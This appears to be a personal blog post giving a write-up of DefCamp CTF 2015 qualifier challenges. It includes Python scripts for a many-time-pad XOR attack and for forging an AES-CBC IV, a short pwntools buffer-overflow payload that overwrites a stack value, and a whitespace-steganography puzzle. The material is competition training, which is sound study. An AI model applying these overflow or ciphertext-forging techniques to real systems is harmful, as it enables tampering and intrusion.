@@ -1,0 +1,146 @@
+---
+layout: post
+title: "DefCamp CTF 2015 - Writeup"
+date: 2015-10-07 00:56:05 +0000
+comments: true
+categories: 
+---
+Last week, Online Qualification of [DefCamp](http://dctf.def.camp/) or [DCTF](http://dctf.def.camp/) was opened.
+Our team don't have chance to join The Final, however, there are some interesting things (with me at least) to share in this post.
+
+
+## Crypto 50
+They give us a text file with content:
+```
+f363844fd41932070e24df7f6c2397b4f0ee4bc567c32e6f8be4665116657ff880756558fe63f47975fa94e8fa1efc6e97cf9c99931ce21d7b03ef4f61bdc6f74fc566cac6f0fe7b939237d3ab9e37adf9910cfc899ed3ff7b79ead95b8aced21ec1079c72409e878425fd61026fbf1e9319ff6dc4c75c356f04ffe204ce480c488ff34eb78034aa23d87309
+d12a9b49d446354e0020912f6f2297b7eaee4f8062c32479d2f66253016b6ab182723152ff69a46178ebd1e5e04ae760978b9c929319ab0a6018b70a5bf5d6b946d27ad8d9e3f9769b923dc9fb953db2b7d816f1889ecbf86a3cbec45e8aced213c44ebd5275cad3d72ef9631f72a15b8f57f123cac412742e03b6fb098b1c350d9bf25db78023ab3690751276f46d9e598a1f0b
+c4629107da0e38541937d43e6366dab7eaff1cc266c32879c5e06440106f63b18e7b7c41fc61a06871e694e8ed4ae760978b9c92930aab19614cf85e2ff1d6f85ec323dfc5f4bc6497df319ab7933cb8a1d958f59f9ec8f97b74eedc578680d61add53f3477ed687942bfe6a1972f2198519e170ced412786105bab618c309340d92f34cbf
+c4629d549106204c0836912b662397b1e0f848c56ec33979d9fc3642116765f49f677e5cf524a0623df6d9f9f50ff864979bd396dd5db21f680fed436cf89fb94cd9678bcce2bc76d6c031c9ae9a26ffa1d91db483d0d9bc6a3df3d5169f8fc65fcd46a0067eddd3d728f5611826a512845cf87a8bc541706a5bfff314c80d2a59ddfb40a88023ab36907b1475e8288f5f86131689d8606623e1629bca36e38a53608b88
+d12a8753c30e204a4d26d82f6623c5e2f4ea57c570c33a6fcea57947446b27fc98777911e369b56171fac6a9f804f1219480819a931ead037f09f7436af3c7b946d27a8bdee4ff7fd6d3279aeac46affb7d80ce7c29efef06d31fa905981ced617cc54f34d75cb8bd723e4241163bc1e9258e066d89053357e04bae308c41a3b4399f242facb32ba20c4641e67f1
+d12a8753c30e204a4d26d82f6623c5e2feee52c571823b79d8a56554076962e29e7d6754b061b86870fadafdea4afa67d99b9b9a9316a7147a18eb4f6ef093fb4cc466cf8dfef23797dc74d3b58237adbbd014b49fcadde57b
+d964d446911838490e2dc3306029c2b1b9f848d26682223cc8ec6649017827f0cd676543f565b92d72f994f9ea0fe06596c2819edd19ad002908f04d66e9c0b944c423ccc8fff96597c631defb9f3cbbb0c11dfa88dbd2e5722dbedf50cf9aca1a8557bf4779dcd39232e4241768b65b8350e46bcec246707603fffb09d81b3b4a98ee03fac139a773c47e1e68bc6b83408d0e118fdd2c312be57ad7d73de7de4a638492956d6ecc9d
+d96cd807d90436421b20c3732e2797a6f0ec55d4238a3c3cc8ea6453117a73f48934785fb070a66c73ecd9e0ea19fc6e97c3d38dd209aa087b4ced426ef393f849d366cf8dfeee379add27cef7d63db1b9c858f5cccdd5ff7938fb90528689cb0b854ebd0664dac2d73afc651f68a61e984db46ad89053736812bce209cf483b4399bd5bb2c577a621c2790926f867895ecf09109e997c342de17390c221e7de4e60c5948f716ec6c9c6322151f9dbb8fe9f411876eb04576524f3f4d6
+d1649b53d90e33070c35c12d6127d4aab9fe4fc570c33c79dde06440082a68f7cd607954b074a6686bf6dbfcea4adb219a868397d60fb6087118b94e66fadaed5e9777c48df2f37a86c720dffb823abaf5da1ded9fcacef47f39b090659a8dca5fd644bb437dd7d4d72be261566dbc149757b462d89041706211f2e515c50b325f92f346a0c939a473c3620963fd65cc4e8617178fcb7f
+d2639a46c31261541937d43e6366d4abe9e359d270c32e6ecea57947106f69b18e7b7f42e476a16e69fad0a9ec19fc6f9ecf9f96dd18a31f290afc4f6bffd2fa469770c3c4f7e83784d733d3a88237ada6911af18fdfc9e27b74ead85396cec11ecb07b14330d7c68423fc7d566fbf0b8c5cf966c5c457712e1eb1b604ca1a3e5a9cef4afac139a773d3771526fe6dcc5f8a061b83d5756623ff739bda26e79a1a62848f937c66d59ddf303249e682
+c7629149911e324e0322913e2e35c3b0fcea5180608a3f74cef73a010a6f71f49f346442f524a06578bfdfece04af86e8b8ad38bdb1cac4d6602fa4f2e
+```
+And a hint is about xor time one time (I can't view exactly problem now).
+Too clear, we will use a technique called **Many Time Pad**.
+
+My old piece of code was useful:
+
+```
+import re
+
+def bstrxor(a, b):     # xor two strings of different lengths
+    if len(a) > len(b):
+        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a[:len(b)], b)])
+    else:
+        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b[:len(a)])])
+
+GUESSWORD = 'The'
+
+if __name__ == '__main__':
+    f = open('input.txt', 'r')
+    clines = f.readlines()
+    f.close()
+
+    n = len(clines)
+
+    for i in range(n):
+        for j in range(n):
+            if (i != j):
+                x = clines[i][:-1].decode('hex')
+                y = clines[j][:-1].decode('hex')
+                pair = bstrxor(x, y)
+                print i, j, '\t', bstrxor(pair, GUESSWORD)
+        print ''
+```
+
+## Crypto 200
+Lucky me, keep the question:
+```
+The folowing plaintext has been encrypted using an unknown key, with AES-128 CBC:
+Original: Pass: sup3r31337. Don't loose it!
+Encrypted: 4f3a0e1791e8c8e5fefe93f50df4d8061fee884bcc5ea90503b6ac1422bda2b2b7e6a975bfc555f44f7dbcc30aa1fd5e
+IV: 19a9d10c3b155b55982a54439cb05dce
+    31396139643130633362313534343466393c3563353534333c61663130626365
+
+How would you modify it so that it now decrypts to: "Pass: notAs3cre7. Don't loose it!" 
+```
+
+First through in my mind is "Bit flipping" cuz, I think **it** in **mofify it** is ciphertext `4f3a0e1791e8c8e5fefe93f50df4d8061fee884bcc5ea90503b6ac1422bda2b2b7e6a975bfc555f44f7dbcc30aa1fd5e`.
+But the block what we need modify is the first one. 
+
+> One hour
+
+> Two hour
+
+> Three hour
+
+> ...
+
+Look at the [CBC Mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation) graph with concentration, we suddenly recognize that the **it** could be `IV` too. If that happended, the solution will be much easier.
+
+Here's my answer:
+```
+def bstrxor(a, b):     # xor two strings of different lengths
+    if len(a) > len(b):
+        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a[:len(b)], b)])
+    else:
+        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b[:len(a)])])
+
+if __name__ == '__main__':
+    #old_iv = "\x19\xa9\xd1\x0c\x3b\x15\x5b\x55\x98\x2a\x54\x43\x9c\xb0\x5d\xce"    
+    old_iv = "19a9d10c3b155b55982a54439cb05dce"
+    print len(old_iv)
+    old_p = "Pass: sup3r31337. Don't loose it!"
+    old_b = "Pass: sup3r31337"
+    static = bstrxor(old_b, old_iv.decode('hex'))
+    print static.encode('hex')
+    print len(static), len(old_b), len(old_iv.decode('hex'))
+
+    new_b = "Pass: notAs3cre7"
+    new_iv = bstrxor(new_b, static)
+    print new_iv.encode('hex')
+```
+
+## Crypto 300
+My teamate solved this challenge with graph algorthm (DFS) and brute-forcing last bit technique.
+However, i haven't ever received detail solution from him, so, it is the only thing i know.
+
+## Pwn 100
+It's a simple Buffer over flow.
+Everything we need is overwrite the xorkey to `0xBADB0169`
+Calculate the space in stack, i have:
+
+```
+## compose_payload.py
+#!/usr/bin/python2.7
+from pwn import *
+
+if __name__ == '__main__':
+    junk = "A" * 52
+    val = 0xBADB0169
+    payload = junk + p32(val)
+    f = open("input.0x", "w")
+    f.write(payload)
+    f.close()
+```
+The hardest work in this challenge must be find out the way to vpn to the server :))
+Then, push the payload to program, we have flag.
+
+## Misc 200
+My teamate give me the web page which contains this text:
+```
+43 61 70 74 75 72 65 20 74 68 65 09 46 6C 61 67 20 28 43 54 46 29 09 69 73 20 61 20 73 70 65 63 69 61 6C 09 6B 69 6E 64 09 6F 66 20 69 6E 66 6F 72 6D 61 74 69 6F 6E 09 73 65 63 75 72 69 74 79 09 63 6F 6D 70 65 74 69 74 69 6F 6E 73 2E 20 54 68 65 72 65 20 61 72 65 09 74 68 72 65 65 20 63 6F 6D 6D 6F 6E 09 74 79 70 65 73 20 6F 66 09 43 54 46 73 3A 09 4A 65 6F 70 61 72 64 79 2C 20 41 74 74 61 63 6B 2D 44 65 66 65 6E 63 65 20 61 6E 64 20 6D 69 78 65 64 2E 09 0D 0A 4A 65 6F 70 61 72 64 79 2D 73 74 79 6C 65 09 43 54 46 73 20 68 61 73 09 61 09 63 6F 75 70 6C 65 20 6F 66 09 71 75 65 73 74 69 6F 6E 73 09 28 74 61 73 6B 73 29 09 69 6E 09 72 61 6E 67 65 20 6F 66 09 63 61 74 65 67 6F 72 69 65 73 2E 09 46 6F 72 20 65 78 61 6D 70 6C 65 2C 09 57 65 62 2C 09 46 6F 72 65 6E 73 69 63 2C 09 43 72 79 70 74 6F 2C 20 42 69 6E 61 72 79 20 6F 72 09 73 6F 6D 65 74 68 69 6E 67 09 65 6C 73 65 2E 20 54 65 61 6D 20 63 61 6E 09 67 61 69 6E 20 73 6F 6D 65 20 70 6F 69 6E 74 73 20 66 6F 72 20 65 76 65 72 79 09 73 6F 6C 76 65 64 20 74 61 73 6B 2E 20 4D 6F 72 65 20 70 6F 69 6E 74 73 20 66 6F 72 20 6D 6F 72 65 20 63 6F 6D 70 6C 69 63 61 74 65 64 09 74 61 73 6B 73 09 75 73 75 61 6C 6C 79 2E 09 54 68 65 20 6E 65 78 74 20 74 61 73 6B 20 69 6E 20 63 68 61 69 6E 20 63 61 6E 09 62 65 09 6F 70 65 6E 65 64 20 6F 6E 6C 79 20 61 66 74 65 72 20 73 6F 6D 65 20 74 65 61 6D 09 73 6F 6C 76 65 20 70 72 65 76 69 6F 75 73 09 74 61 73 6B 2E 09 54 68 65 6E 09 74 68 65 20 67 61 6D 65 20 74 69 6D 65 09 69 73 20 6F 76 65 72 20 73 75 6D 09 6F 66 09 70 6F 69 6E 74 73 09 73 68 6F 77 73 20 79 6F 75 09 61 20 43 54 46 20 77 69 6E 65 72 2E 20 46 61 6D 6F 75 73 20 65 78 61 6D 70 6C 65 09 6F 66 20 73 75 63 68 20 43 54 46 20 69 73 20 44 65 66 63 6F 6E 20 43 54 46 20 71 75 61 6C 73 2E 09 0D 0A 57 65 6C 6C 2C 09 61 74 74 61 63 6B 2D 64 65 66 65 6E 63 65 20 69 73 09 61 6E 6F 74 68 65 72 20 69 6E 74 65 72 65 73 74 69 6E 67 20 6B 69 6E 64 09 6F 66 20 63 6F 6D 70 65 74 69 74 69 6F 6E 73 2E 09 48 65 72 65 09 65 76 65 72 79 20 74 65 61 6D 09 68 61 73 09 6F 77 6E 09 6E 65 74 77 6F 72 6B 28 6F 72 20 6F 6E 6C 79 20 6F 6E 65 20 68 6F 73 74 29 09 77 69 74 68 20 76 75 6C 6E 61 72 61 62 6C 65 20 73 65 72 76 69 63 65 73 2E 20 59 6F 75 72 20 74 65 61 6D 20 68 61 73 20 74 69 6D 65 09 66 6F 72 09 70 61 74 63 68 69 6E 67 20 79 6F 75 72 09 73 65 72 76 69 63 65 73 09 61 6E 64 20 64 65 76 65 6C 6F 70 69 6E 67 20 65 78 70 6C 6F 69 74 73 20 75 73 75 61 6C 6C 79 2E 09 53 6F 2C 09 74 68 65 6E 20 6F 72 67 61 6E 69 7A 65 72 73 09 63 6F 6E 6E 65 63 74 73 20 70 61 72 74 69 63 69 70 61 6E 74 73 20 6F 66 09 63 6F 6D 70 65 74 69 74 69 6F 6E 20 61 6E 64 09 74 68 65 09 77 61 72 67 61 6D 65 09 73 74 61 72 74 73 21 20 59 6F 75 20 73 68 6F 75 6C 64 09 70 72 6F 74 65 63 74 09 6F 77 6E 20 72 65 64 09 68 65 72 72 69 6E 67 09 66 6F 72 20 64 65 66 65 6E 63 65 20 70 6F 69 6E 74 73 20 61 6E 64 09 68 61 63 6B 09 6F 70 70 6F 6E 65 6E 74 73 20 66 6F 72 20 61 74 74 61 63 6B 09 70 6F 69 6E 74 73 2E 09 48 69 73 74 6F 72 69 63 61 6C 6C 79 20 74 68 69 73 20 69 73 20 61 20 66 69 72 73 74 20 74 79 70 65 20 6F 66 09 43 54 46 73 2C 09 65 76 65 72 79 62 6F 64 79 20 6B 6E 6F 77 73 20 61 62 6F 75 74 20 44 45 46 20 43 4F 4E 20 43 54 46 20 2D 09 73 6F 6D 65 74 68 69 6E 67 09 6C 69 6B 65 20 61 20 57 6F 72 6C 64 20 43 75 70 20 6F 66 20 61 6C 6C 09 6F 74 68 65 72 09 63 6F 6D 70 65 74 69 74 69 6F 6E 73 2E 09 0D 0A 4D 69 78 65 64 20 63 6F 6D 70 65 74 69 74 69 6F 6E 73 20 6D 61 79 20 76 61 72 79 20 70 6F 73 73 69 62 6C 65 20 66 6F 72 6D 61 74 73 2E 09 49 74 09 6D 61 79 20 62 65 20 73 6F 6D 65 74 68 69 6E 67 20 6C 69 6B 65 20 77 61 72 67 61 6D 65 09 77 69 74 68 20 73 70 65 63 69 61 6C 09 74 69 6D 65 09 66 6F 72 09 74 61 73 6B 2D 62 61 73 65 64 20 65 6C 65 6D 65 6E 74 73 20 28 6C 69 6B 65 09 55 43 53 42 20 69 43 54 46 29 2E 20 0D 0A 43 54 46 09 67 61 6D 65 73 09 6F 66 74 65 6E 09 74 6F 75 63 68 20 6F 6E 09 6D 61 6E 79 20 6F 74 68 65 72 20 61 73 70 65 63 74 73 20 6F 66 20 69 6E 66 6F 72 6D 61 74 69 6F 6E 09 73 65 63 75 72 69 74 79 3A 09 63 72 79 70 74 6F 67 72 61 70 68 79 2C 20 73 74 65 67 6F 2C 20 62 69 6E 61 72 79 09 61 6E 61 6C 79 73 69 73 2C 20 72 65 76 65 72 73 65 20 65 6E 67 65 6E 65 65 72 69 6E 67 2C 20 6D 6F 62 69 6C 65 09 73 65 63 75 72 69 74 79 20 61 6E 64 09 6F 74 68 65 72 73 2E 09 47 6F 6F 64 09 74 65 61 6D 73 20 67 65 6E 65 72 61 6C 6C 79 20 68 61 76 65 09 73 74 72 6F 6E 67 09 73 6B 69 6C 6C 73 09 61 6E 64 20 65 78 70 65 72 69 65 6E 63 65 20 69 6E 09 61 6C 6C 20 74 68 65 73 65 20 69 73 73 75 65 73 2E 09 0D 0A 41 6C 6C 09 72 69 67 68 74 73 20 72 65 73 65 72 76 65 64 09 74 6F 20 63 74 66 74 69 6D 65 2E 6F 72 67 20 0D 0A 45 6E 6A 6F 79 09 74 68 69 73 20 43 54 46 09 61 6E 64 09 67 65 74 09 69 6E 20 74 68 65 20 66 69 6E 61 6C 20 72 6F 75 6E 64 21
+
+Capture the.Flag (CTF).is a special.kind.of information.security.competitions. There are.three common.types of.CTFs:.Jeopardy, Attack-Defence and mixed....Jeopardy-style.CTFs has.a.couple of.questions.(tasks).in.range of.categories..For example,.Web,.Forensic,.Crypto, Binary or.something.else. Team can.gain some points for every.solved task. More points for more complicated.tasks.usually..The next task in chain can.be.opened only after some team.solve previous.task..Then.the game time.is over sum.of.points.shows you.a CTF winer. Famous example.of such CTF is Defcon CTF quals....Well,.attack-defence is.another interesting kind.of competitions..Here.every team.has.own.network(or only one host).with vulnarable services. Your team has time.for.patching your.services.and developing exploits usually..So,.then organizers.connects participants of.competition and.the.wargame.starts! You should.protect.own red.herring.for defence points and.hack.opponents for attack.points..Historically this is a first type of.CTFs,.everybody knows about DEF CON CTF -.something.like a World Cup of all.other.competitions....Mixed competitions may vary possible formats..It.may be something like wargame.with special.time.for.task-based elements (like.UCSB iCTF). ..CTF.games.often.touch on.many other aspects of information.security:.cryptography, stego, binary.analysis, reverse engeneering, mobile.security and.others..Good.teams generally have.strong.skills.and experience in.all these issues....All.rights reserved.to ctftime.org ..Enjoy.this CTF.and.get.in the final round!
+```
+
+I give care to the space between words: sometime they are `\x20`, something not. It may be binary's sign.
+
+I read from first character to last, if it's pure space character `\x20`, i got `0` and `1` in otherwise.
+Convert the result to ascii, i have the name to download next file.
+
+The remaining part is belong to my friends.
